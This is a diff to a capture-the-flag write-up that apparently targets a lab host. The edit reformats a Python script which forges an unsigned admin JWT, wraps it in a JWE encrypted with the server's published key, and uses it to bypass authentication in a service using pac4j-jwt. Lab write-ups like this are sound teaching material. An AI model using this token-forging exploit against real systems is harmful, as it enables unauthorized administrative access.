@@ -48,9 +48,7 @@ The http responses also included the header:
 X-Powered-By: pac4j-jwt/6.0.3
 ```
 
-This indicated the server was using the `pac4j-jwt` library.
-### 2.1 Web Enum
-Since there was a web service, my next step was to inspect the website itself. To learn more about the client-side Javascript, I looked at the main `app.js` code used by the site:
+This indicated the server was using the `pac4j-jwt` library. Looking deeper into the service, I inspected the website itself. To learn more about the client-side Javascript, I looked at the main `app.js` code used by the site:
 ```
 └─$ curl -s http://10.129.4.116:8080/static/js/app.js
 /**
@@ -116,113 +114,53 @@ Using this vulnerability, it is possible to:
 To automate this process, I wrote the following Python script.
 ```
 #!/usr/bin/env python3
-
 import json
-
 import time
-
 import base64
-
 import requests
-
 from jwcrypto import jwk, jwe
-
 import sys
-
   
-
 TARGET = sys.argv[1]
-
-  
 
 print("[*] Fetching JWKS...")
 
-  
-
 resp = requests.get(f"{TARGET}/api/auth/jwks")
-
 jwks_data = resp.json()
-
 key_data = jwks_data['keys'][0]
-
 pub_key = jwk.JWK(**key_data)
-
-  
 
 print(f"[+] Got RSA public key (kid: {key_data['kid']})")
 
-  
-
 def b64url_encode(data):
-
-return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
-
-  
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
 
 now = int(time.time())
-
 header = b64url_encode(json.dumps({"alg": "none"}).encode())
-
 payload = b64url_encode(json.dumps({
-
-"sub": "admin",
-
-"role": "ROLE_ADMIN",
-
-"iss": "principal-platform",
-
-"iat": now,
-
-"exp": now + 3600
-
-}).encode())
-
-  
+    "sub": "admin",
+    "role": "ROLE_ADMIN",
+    "iss": "principal-platform",
+    "iat": now,
+    "exp": now + 3600
+    }).encode())
 
 plain_jwt = f"{header}.{payload}."
-
 print(f"[*] Crafted PlainJWT with sub=admin, role=ROLE_ADMIN")
 
-  
-
-jwe_token = jwe.JWE(
-
-plain_jwt.encode(),
-
-recipient=pub_key,
-
-protected=json.dumps({
-
-"alg": "RSA-OAEP-256",
-
-"enc": "A128GCM",
-
-"kid": key_data['kid'],
-
-"cty": "JWT"
-
-})
-
-)
+jwe_token = jwe.JWE(plain_jwt.encode(), recipient=pub_key, protected=json.dumps({"alg":"RSA-OAEP-256", "enc":"A128GCM", "kid":key_data['kid'], "cty":"JWT"}))
 
 forged_token = jwe_token.serialize(compact=True)
-
 print(f"[+] Forged JWE token created")
 
-  
-
 headers = {"Authorization": f"Bearer {forged_token}"}
-
 print("\n[*] Accessing /api/dashboard...")
 
 resp = requests.get(f"{TARGET}/api/dashboard", headers=headers)
-
 print(f"[+] Status: {resp.status_code}")
 
 data = resp.json()
-
 print(f"[+] Authenticated as: {data['user']['username']} ({data['user']['role']})")
-
 print(f"[+] Token: {forged_token}")
 ```
 
